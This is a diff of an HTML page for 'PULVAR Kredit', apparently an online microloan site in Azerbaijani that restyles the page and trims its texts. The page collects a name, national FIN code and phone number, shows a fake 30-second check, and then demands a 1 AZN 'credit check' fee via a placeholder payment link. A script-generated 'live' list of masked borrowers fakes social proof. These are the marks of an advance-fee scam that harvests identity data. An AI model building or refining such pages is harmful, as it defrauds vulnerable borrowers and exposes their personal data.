@@ -6,21 +6,21 @@
 <title>PULVAR Kredit</title>
 
 <style>
-body{margin:0;font-family:Arial;background:#c90000;color:#fff}
+body{margin:0;font-family:Arial;background:#ffffff;color:#000}
 .container{max-width:420px;margin:auto;padding:20px}
 .logo{text-align:center;font-size:32px;font-weight:900;margin-top:20px}
 .subtitle{text-align:center;margin-bottom:20px}
 
 .lang{display:flex;justify-content:flex-end;gap:8px}
-.lang button{border:1px solid #fff;background:none;color:#fff;padding:6px 10px;border-radius:15px}
+.lang button{border:1px solid #000;background:none;color:#000;padding:6px 10px;border-radius:15px}
 
-.card{background:#ed0000;border-radius:25px;padding:20px}
+.card{background:#f2f2f2;border-radius:25px;padding:20px}
 .top{display:flex;justify-content:space-between;font-size:22px;font-weight:900}
 input[type=range]{width:100%;margin:25px 0}
-.row{display:flex;justify-content:space-between;padding:12px 0;border-top:2px solid #fff;font-weight:900}
+.row{display:flex;justify-content:space-between;padding:12px 0;border-top:2px solid #000;font-weight:900}
 .info{margin-top:15px;font-size:15px}
 
-.btn{width:100%;margin-top:20px;padding:18px;border:none;border-radius:30px;font-size:20px;font-weight:900;background:linear-gradient(90deg,#d9ff00,#38d9c5);color:#000}
+.btn{width:100%;margin-top:20px;padding:18px;border:none;border-radius:30px;font-size:20px;font-weight:900;background:linear-gradient(90deg,#00ffcc,#00ccff);color:#000}
 
 .section{display:none;background:#fff;color:#000;padding:20px;border-radius:20px;margin-top:20px}
 
@@ -29,13 +29,13 @@ input{width:100%;padding:12px;margin:8px 0;border-radius:10px;border:1px solid #
 .error{color:red;font-weight:900}
 .wait{text-align:center;font-size:20px;font-weight:900}
 
-.payBtn{background:green;color:#fff;border:none;padding:15px;border-radius:12px;margin-top:10px;font-weight:900}
+.payBtn{background:#00aa55;color:#fff;border:none;padding:15px;border-radius:12px;margin-top:10px;font-weight:900}
 
-.live{background:#ed0000;margin-top:20px;padding:15px;border-radius:20px}
+.live{background:#f2f2f2;margin-top:20px;padding:15px;border-radius:20px}
 .liveitem{background:#fff;color:#000;margin:5px 0;padding:8px;border-radius:10px;font-weight:700}
 
 .stat{display:flex;justify-content:space-between;margin-top:10px}
-.stat div{background:#fff;color:#c90000;padding:10px;border-radius:10px;width:48%;text-align:center;font-weight:900}
+.stat div{background:#fff;color:#000;padding:10px;border-radius:10px;width:48%;text-align:center;font-weight:900}
 
 .about{margin-top:20px;font-size:14px}
 
@@ -65,17 +65,17 @@ input{width:100%;padding:12px;margin:8px 0;border-radius:10px;border:1px solid #
 <input type="range" id="amount" min="20" max="220" step="10" value="20">
 
 <div class="row">
-<span id="kredit">Kreditin məbləği</span>
+<span>Kreditin məbləği</span>
 <span><b id="amountResult">20</b> ₼</span>
 </div>
 
 <div class="row">
-<span id="muddet">Kreditin müddəti</span>
+<span>Kreditin müddəti</span>
 <span>45 gün</span>
 </div>
 
 <div class="row">
-<span id="tarix">Ödəniş tarixi</span>
+<span>Ödəniş tarixi</span>
 <span id="date"></span>
 </div>
 
@@ -84,9 +84,8 @@ input{width:100%;padding:12px;margin:8px 0;border-radius:10px;border:1px solid #
 <button class="btn" onclick="openForm()" id="btnMain">Vəsait əldə etmək</button>
 </div>
 
-<!-- FORM -->
 <div class="section" id="formBox">
-<h3 id="formTitle">Məlumatları daxil et</h3>
+<h3>Məlumatları daxil et</h3>
 <input id="nameInput" placeholder="Ad Soyad">
 <input id="finInput" placeholder="FIN kod">
 <input id="phoneInput" placeholder="Nömrə">
@@ -94,20 +93,17 @@ input{width:100%;padding:12px;margin:8px 0;border-radius:10px;border:1px solid #
 <div class="error" id="error"></div>
 </div>
 
-<!-- WAIT -->
 <div class="section wait" id="waitBox">
-<p id="waitText">Yoxlanılır...</p>
+<p>Yoxlanılır...</p>
 <p><span id="count">30</span> saniyə gözləyin</p>
 </div>
 
-<!-- PAYMENT -->
 <div class="section" id="payBox">
-<h3 id="dear">Hörmətli müştəri!</h3>
+<h3>Hörmətli müştəri!</h3>
 <p id="payText"></p>
-<button class="payBtn" onclick="payNow()" id="payBtn">Ödəniş et</button>
+<button class="payBtn" onclick="payNow()">Ödəniş et</button>
 </div>
 
-<!-- LIVE -->
 <div class="live">
 <div id="liveList"></div>
 
@@ -119,7 +115,7 @@ input{width:100%;padding:12px;margin:8px 0;border-radius:10px;border:1px solid #
 
 <div class="about">
 <b>Sayt haqqında:</b><br>
-PULVAR.XYZ onlayn kredit müraciəti platformasıdır. İstifadəçilər sürətli şəkildə müraciət göndərir və nəticə qısa zamanda təqdim olunur.
+PULVAR.XYZ onlayn kredit müraciəti platformasıdır.
 </div>
 
 <div class="footer">
@@ -184,7 +180,7 @@ function checkForm(){
    waitBox.style.display="none";
    payBox.style.display="block";
 
-   payText.innerHTML=name+` , kredit tarixçənizin yoxlanılması üçün 1 AZN ödəniş tələb olunur.<br><br>Ödəniş etdiyiniz məbləğ SONRA AVTOMATIK geri qaytarılacaq.`;
+   payText.innerHTML=name+` , kredit yoxlanışı üçün 1 AZN ödəniş tələb olunur.`;
   }
  },1000);
 }
@@ -193,7 +189,6 @@ function payNow(){
  window.location.href="https://epoint.az/pay/SENIN_LINK";
 }
 
-// LIVE DATA
 let names=["K***N","M***D","R***L","T***N","A***R"];
 let amounts=[20,40,60,80,100,120,150,200];
 
@@ -230,7 +225,6 @@ function addLive(){
 
 setInterval(addLive,10000);
 
-// LANG
 function setLang(l){
  if(l=="ru"){
   subtitle.innerText="Быстрая заявка";
